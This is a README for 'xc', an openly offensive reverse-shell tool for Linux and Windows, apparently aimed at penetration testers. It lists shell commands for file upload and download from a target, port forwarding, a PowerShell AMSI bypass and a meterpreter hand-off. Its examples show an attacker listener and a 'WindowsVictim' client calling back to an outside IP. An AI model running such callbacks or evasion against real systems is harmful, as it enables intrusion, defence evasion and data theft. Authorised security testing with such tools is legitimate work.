# XC

Netcat like reverse shell for Linux & Windows.

## Features

### Windows

```  
Usage:
└ Shared Commands:  !exit
  !upload <src> <dst>
   * uploads a file to the target
  !download <src> <dst>
   * downloads a file from the target
  !lfwd <localport> <remoteaddr> <remoteport>
   * local portforwarding (like ssh -L)
  !rfwd <remoteport> <localaddr> <localport>
   * remote portforwarding (like ssh -R)
  !lsfwd
   * lists active forwards
  !rmfwd <index>
   * removes forward by index
  !plugins
   * lists available plugins
  !plugin <plugin>
   * execute a plugin
  !spawn <port>
   * spawns another client on the specified port
  !shell
   * runs /bin/sh
  !runas <username> <password> <domain>
   * restart xc with the specified user
  !met <port>
   * connects to a x64/meterpreter/reverse_tcp listener
└ OS Specific Commands:
  !powershell
    * starts powershell with AMSI Bypass
  !rc <port>
    * connects to a local bind shell and restarts this client over it
  !runasps <username> <password> <domain>
    * restart xc with the specified user using powershell
  !vulns
    * checks for common vulnerabilities
``` 

### Linux

```
Usage:
└ Shared Commands:  !exit
  !upload <src> <dst>
   * uploads a file to the target
  !download <src> <dst>
   * downloads a file from the target
  !lfwd <localport> <remoteaddr> <remoteport>
   * local portforwarding (like ssh -L)
  !rfwd <remoteport> <localaddr> <localport>
   * remote portforwarding (like ssh -R)
  !lsfwd
   * lists active forwards
  !rmfwd <index>
   * removes forward by index
  !plugins
   * lists available plugins
  !plugin <plugin>
   * execute a plugin
  !spawn <port>
   * spawns another client on the specified port
  !shell
   * runs /bin/sh
  !runas <username> <password> <domain>
   * restart xc with the specified user
  !met <port>
   * connects to a x64/meterpreter/reverse_tcp listener
└ OS Specific Commands:
 !ssh <port>
   * starts sshd with the configured keys on the specified port
``` 

## Examples

- Linux Attacker:	  `rlwrap xc -l -p 1337`			(Server)
- WindowsVictim :   `xc.exe 10.10.14.4 1337`	  (Client)
- Argumentless:     `xc_10.10.14.4_1337.exe`    (Client)

## Setup

Make sure you are running golang version 1.15+, older versions will not compile. I tested it on ubuntu: `go version go1.16.2 linux/amd64` and kali `go version go1.15.9 linux/amd64`

``` 
git clone --recurse-submodules https://github.com/xct/xc.git

GO111MODULE=off go get golang.org/x/sys/...
GO111MODULE=off go get golang.org/x/text/encoding/unicode
GO111MODULE=off go get github.com/hashicorp/yamux
GO111MODULE=off go get github.com/libp2p/go-reuseport
sudo apt-get install rlwrap upx
``` 

Linux:
```
python3 build.py
```

## Credits

* Included for Windows Clients: https://github.com/itm4n/PrivescCheck  
* Included for Windows Clients: https://github.com/PowerShell/Win32-OpenSSH